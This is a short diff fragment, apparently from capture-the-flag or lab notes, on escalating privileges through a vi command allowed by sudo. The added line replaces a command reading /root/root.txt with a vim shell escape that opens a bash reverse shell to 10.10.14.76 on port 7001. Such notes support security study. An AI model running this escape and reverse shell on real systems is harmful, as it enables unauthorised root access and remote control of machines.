@@ -53,5 +53,5 @@ p2:       output=getCsvFile
 
 
 # sudo -l tells you we can use vi on a directory. in vim you can then:
-    ':!cat /root/root.txt'
+    ':!bash -i >& /dev/tcp/10.10.14.76/7001 0>&1'
 
